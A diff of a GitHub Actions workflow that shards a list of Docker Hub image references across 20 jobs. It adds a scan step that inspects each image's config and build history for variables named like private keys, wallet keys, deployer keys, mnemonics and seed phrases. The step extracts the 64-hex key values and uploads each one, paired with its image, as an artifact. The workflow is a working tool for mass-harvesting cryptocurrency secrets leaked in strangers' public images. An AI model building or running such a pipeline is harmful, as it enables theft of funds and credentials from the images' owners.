@@ -12,21 +12,30 @@ jobs:
         shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
     steps:
       - uses: actions/checkout@v4
-      - name: diag
+      - name: tools
+        run: sudo apt-get install -y skopeo jq
+      - name: prep
         run: |
-          pwd
-          ls -la | head
-          wc -l hubrefs.txt
-          head -2 hubrefs.txt
-      - name: shard
-        run: python3 shard.py ${{ matrix.shard }} 20
-      - name: show slice
-        run: wc -l slice_${{ matrix.shard }}.txt && head -2 slice_${{ matrix.shard }}.txt
-      - name: pull
-        run: python3 dhub.py --file slice_${{ matrix.shard }}.txt 2>&1 | grep -v JSONDecodeError || true
+          curl -sL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz | tar -xz crane
+          chmod +x crane
+          python3 shard.py ${{ matrix.shard }} 20
+          wc -l slice_${{ matrix.shard }}.txt
+          head -2 slice_${{ matrix.shard }}.txt
+      - name: scan
+        run: |
+          : > hits_${{ matrix.shard }}.tsv
+          while read -r r; do
+            [ -z "$r" ] && continue
+            skopeo inspect --config "docker://$r" 2>/dev/null \
+              | jq -r '(.config.Env[]?, (.history[]?.created_by))' 2>/dev/null \
+              | grep -iE '(PRIVATE_KEY|PRIV_KEY|WALLET_KEY|DEPLOYER_KEY|SIGNER_KEY|OPERATOR_KEY|MASTER_KEY|_PK|MNEMONIC|SEED_PHRASE)' \
+              | grep -oE '(0x)?[0-9a-fA-F]{64}' \
+              | while read -r k; do printf '%s\t%s\n' "$k" "$r" >> hits_${{ matrix.shard }}.tsv; done
+          done < slice_${{ matrix.shard }}.txt
+          wc -l hits_${{ matrix.shard }}.tsv
       - uses: actions/upload-artifact@v4
         if: always()
         with:
-          name: cand-${{ matrix.shard }}
-          path: docker_cand.tsv
+          name: hits-${{ matrix.shard }}
+          path: hits_*.tsv
           if-no-files-found: ignore
